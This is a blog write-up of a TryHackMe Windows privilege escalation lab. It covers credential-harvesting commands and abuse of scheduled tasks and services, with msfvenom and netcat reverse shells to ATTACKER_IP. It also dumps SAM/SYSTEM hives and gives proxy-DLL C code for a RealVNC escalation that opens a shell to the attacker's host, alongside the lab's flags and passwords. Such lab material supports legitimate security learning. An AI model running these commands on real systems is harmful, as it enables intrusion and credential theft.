@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>TryHackMe - Windows Privilege Escalation</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - Windows Privilege Escalation | 0xskar</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="TryHackMe - Windows Privilege Escalation" />
+<meta name="author" content="0xskar" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://tryhackme.com/room/windowsprivesc20" />
+<meta property="og:description" content="https://tryhackme.com/room/windowsprivesc20" />
+<link rel="canonical" href="http://localhost:4000/TryHackMe-Windows-PrivEsc" />
+<meta property="og:url" content="http://localhost:4000/TryHackMe-Windows-PrivEsc" />
+<meta property="og:site_name" content="0xskar" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-17T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe - Windows Privilege Escalation" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0xskar","url":"https://0xskar.github.io"},"dateModified":"2022-06-17T00:00:00-07:00","datePublished":"2022-06-17T00:00:00-07:00","description":"https://tryhackme.com/room/windowsprivesc20","headline":"TryHackMe - Windows Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/TryHackMe-Windows-PrivEsc"},"url":"http://localhost:4000/TryHackMe-Windows-PrivEsc"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>0xskar@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TryHackMe - Windows Privilege Escalation</h2>
+  <time datetime="2022-06-17T00:00:00-07:00" class="by-line">17 Jun 2022</time>
+  <p><a href="https://tryhackme.com/room/windowsprivesc20">https://tryhackme.com/room/windowsprivesc20</a></p>
+
+<p>Learn the fundamentals of Windows privilege escalation techniques.</p>
+
+<hr />
+
+<h2 id="task-1---introduction"><a href="#header-2"></a>Task 1 - Introduction</h2>
+
+<p>This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.</p>
+
+<hr />
+
+<h2 id="task-2---windows-privilege-escalation"><a href="#header-2"></a>Task 2 - Windows Privilege Escalation</h2>
+
+<p>Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won’t always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:</p>
+
+<ul>
+  <li>Misconfigurations on Windows services or scheduled tasks</li>
+  <li>Excessive privileges assigned to our account</li>
+  <li>Vulnerable software</li>
+  <li>Missing Windows security patches</li>
+</ul>
+
+<h5 id="answer-the-questions-below"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>Users that can change system configurations are part of which group?</strong></p>
+
+<ul>
+  <li>administrators</li>
+</ul>
+
+<p><strong>The SYSTEM account has more privileges than the Administrator user (aye/nay)</strong></p>
+
+<ul>
+  <li>aye</li>
+</ul>
+
+<hr />
+
+<h2 id="task-3---harvesting-passwords-from-usual-spots"><a href="#header-2"></a>Task 3 - Harvesting Passwords from Usual Spots</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> - PowerShell History</li>
+  <li><code class="language-plaintext highlighter-rouge">cmdkey /list</code> - Saved Windows Credentials</li>
+  <li><code class="language-plaintext highlighter-rouge">runas /savecred /user:admin cmd.exe</code> - if you notice any credentials worth trying, you can use them</li>
+  <li><code class="language-plaintext highlighter-rouge">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</code> can store password for databases on IIS configs in the following locations: <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\web.config</code> or <code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</code></li>
+  <li><code class="language-plaintext highlighter-rouge">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s</code> - retrive stored proxy credentials.</li>
+</ul>
+
+<p>Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.</p>
+
+<h5 id="answer-the-questions-below-1"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>A password for the julia.jones user has been left on the Powershell history. What is the password?</strong></p>
+
+<ul>
+  <li>ZuperCkretPa5z</li>
+</ul>
+
+<p><strong>A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?</strong></p>
+
+<ul>
+  <li>098n0x35skjD3</li>
+</ul>
+
+<p><strong>There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.</strong></p>
+
+<ol>
+  <li>cmdkey /list</li>
+  <li>runas /savecred /user:mike.katz cmd.exe</li>
+  <li>THM{WHAT_IS_MY_PASSWORD}</li>
+</ol>
+
+<p><strong>Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?</strong></p>
+
+<ol>
+  <li>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f “ProxyPassword” /s</li>
+  <li>CoolPass2021</li>
+</ol>
+
+<hr />
+
+<h2 id="task-4---other-quick-wins"><a href="#header-2"></a>Task 4 - Other Quick Wins</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">schtasks</code> lists scheduled tasks.</li>
+  <li><code class="language-plaintext highlighter-rouge">schtasks /query /tn TASK_NAME /fo list /v</code> - list detailed information on a task. We want to look at <strong>Task to Run:</strong> and <strong>Run As User</strong>. If the current user can modify or overwrite the Task to Run executable we can do privesc.</li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">icalcs</code> check file permissions</p>
+  </li>
+  <li>AlwaysInstallElevated we can generate installers with malicious .msi files using msvenom eg <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.42.60 LPORT=LOCAL_PORT -f msi -o malicious.msi</code></li>
+</ul>
+
+<h5 id="answer-the-questions-below-2"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>What is the taskusr1 flag?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</code></li>
+  <li>setup netcat listener</li>
+  <li>flag is on desktop</li>
+</ul>
+
+<hr />
+
+<h2 id="task-5---abusing-service-misconfigurations"><a href="#header-2"></a>Task 5 - Abusing Service Misconfigurations</h2>
+
+<p><strong>Windows Services</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sc qc</code> understand service structure - <code class="language-plaintext highlighter-rouge">BINARY_PATH_NAME</code> executable, <code class="language-plaintext highlighter-rouge">SERVICE_START_NAME</code> account used to run the service</li>
+  <li>All service configs are stored on the registry @ <code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Services\</code></li>
+</ul>
+
+<p><strong>Insecure Permissions on Service Executable</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sc qc</code> check service</li>
+  <li><code class="language-plaintext highlighter-rouge">icacls</code> check permissions on service executable - if lower permission we can overwrite with payload, and service will execute.</li>
+  <li><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</code> create payload</li>
+  <li><code class="language-plaintext highlighter-rouge">python3 -m http.server</code></li>
+  <li>pull from powershell with <code class="language-plaintext highlighter-rouge">wget http://10.2.127.225:8000/rev-svc.exe -O rev-svc.exe</code></li>
+  <li>replace service executable with payload <code class="language-plaintext highlighter-rouge">move Wservice.exe Wservice.exe.bkp</code> and <code class="language-plaintext highlighter-rouge">move rev-svc.exe Wservice.exe</code></li>
+  <li>and grant permissions with <code class="language-plaintext highlighter-rouge">icalcs WService.exe /grant Everyone:F</code></li>
+  <li>start up netcat listener</li>
+  <li>restart service <code class="language-plaintext highlighter-rouge">sc stop windowsscheduler</code> <code class="language-plaintext highlighter-rouge">sc start windowsscheduler</code> (with powershell you need sc.exe as sc = set-content)</li>
+</ul>
+
+<h5 id="answer-the-questions-below-3"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>Get the flag on svcusr1’s desktop.</strong></p>
+
+<ul>
+  <li>Follow Insecure Permissions on Service Executable Steps</li>
+  <li>THM{AT_YOUR_SERVICE}</li>
+</ul>
+
+<p><strong>Get the flag on svcusr2’s desktop.</strong></p>
+
+<ul>
+  <li>Follow Unquoted Service Paths</li>
+  <li>THM{QUOTES_EVERYWHERE}</li>
+</ul>
+
+<p><strong>Get the flag on the Administrator’s desktop.</strong></p>
+
+<ul>
+  <li>Follow Insecure Service Permissions</li>
+  <li>THM{INSECURE_SVC_CONFIG}</li>
+</ul>
+
+<hr />
+
+<h2 id="task-6---abusing-dangerous-privileges"><a href="#header-2"></a>Task 6 - Abusing dangerous privileges</h2>
+
+<p>Windows Privileges:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">whoami /priv</code> check privileges. <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">complete list of windows priv</a>. list of exploitable priveleges <a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a></li>
+</ul>
+
+<p>Backup SAM and SYSTEM hashes:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">reg save hklm\system C:\Users\THMBackup\system.hive</code></li>
+  <li><code class="language-plaintext highlighter-rouge">reg save hklm\sam C:\Users\THMBackup\sam.hive</code></li>
+</ul>
+
+<p>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket’s smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox.</p>
+
+<h5 id="answer-the-questions-below-4"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>Get the flag on the Administrator’s desktop.</strong></p>
+
+<ul>
+  <li>THM{SEFLAGPRIVILEGE}</li>
+</ul>
+
+<hr />
+
+<h2 id="task-7---abusing-vulnerable-software"><a href="#header-2"></a>Task 7 - Abusing vulnerable software</h2>
+
+<p><code class="language-plaintext highlighter-rouge">wmic</code> list software installed and versions
+<code class="language-plaintext highlighter-rouge">wmic product get name,version,vendor</code></p>
+
+<p>Doing this on the target we can see its running RealVNC 6.8.0 and that has a privelede escalation vulnerability https://www.triskelelabs.com/realvnc-server-privilege-escalation.</p>
+
+<p><strong>Create a Proxy DLL</strong></p>
+
+<ol>
+  <li>proxy.c</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span>
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fdwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">system</span><span class="p">(</span><span class="s">"whoami &gt; C:</span><span class="se">\\</span><span class="s">output.txt"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>proxy.def</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">EXPORTS</span>
+    <span class="n">Method1</span><span class="o">=</span><span class="n">C</span><span class="o">:/</span><span class="n">Windows</span><span class="o">/</span><span class="n">System32</span><span class="o">/</span><span class="n">original</span><span class="p">.</span><span class="n">dll</span><span class="p">.</span><span class="n">Method1</span> <span class="err">@</span><span class="mi">1</span>
+    <span class="n">Method2</span><span class="o">=</span><span class="n">C</span><span class="o">:/</span><span class="n">Windows</span><span class="o">/</span><span class="n">System32</span><span class="o">/</span><span class="n">original</span><span class="p">.</span><span class="n">dll</span><span class="p">.</span><span class="n">Method2</span> <span class="err">@</span><span class="mi">2</span>
+</code></pre></div></div>
+
+<ol>
+  <li>We need a list of all the exports available in the origional DLL we are replacing. Copy <code class="language-plaintext highlighter-rouge">c:\Windows\System32\adsldpc.dll</code> to our machine using <code class="language-plaintext highlighter-rouge">smbserver.py</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">mkdir share</code></li>
+      <li><code class="language-plaintext highlighter-rouge">smbserver.py -smb2support -username thm-unpriv -password Password321 public share</code></li>
+    </ul>
+  </li>
+  <li>on the target machine cmd.exe <code class="language-plaintext highlighter-rouge">copy C:\Windows\System32\adsldpc.dll \\ATTACKER_IP\public\</code> to move it to our attacking machine.</li>
+  <li>copy modified room code to <code class="language-plaintext highlighter-rouge">get_exports.py</code> and run it with <code class="language-plaintext highlighter-rouge">--target adsldpc.dll --origionalPath 'C:\Windows\System32\adsldpc.dll' &gt; proxy.def</code></li>
+  <li>compile the DLL with
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel</code></li>
+      <li><code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll</code></li>
+    </ul>
+  </li>
+</ol>
+
+<h4 id="putting-it-all-together"><a href="#header-4"></a>Putting it All together**</h4>
+
+<ol>
+  <li>Copy the file over with smbserer running <code class="language-plaintext highlighter-rouge">copy \\10.2.127.225\public\proxy.dll</code> and rename <code class="language-plaintext highlighter-rouge">move proxy.dll adsldpc.dll</code></li>
+  <li>Running VNC repair in add/remove programs will give us the output.txt and we can see the user is <code class="language-plaintext highlighter-rouge">nt authorioty/system</code></li>
+</ol>
+
+<h4 id="repeat-with-reverse-shell-to-get-flag"><a href="#header-4"></a>Repeat with Reverse Shell To get Flag</h4>
+
+<ol>
+  <li>ncshell.c</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span>
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fdwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">system</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">tools</span><span class="se">\\</span><span class="s">nc64.exe -e cmd.exe 10.2.127.225 6666"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>compile dll again/copy over, repeat VNC repair after setting up netcat listener on kali machine.</li>
+</ol>
+
+<hr />
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>0xskar</b>
+    </span>
+    
+    <span>© 2022</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
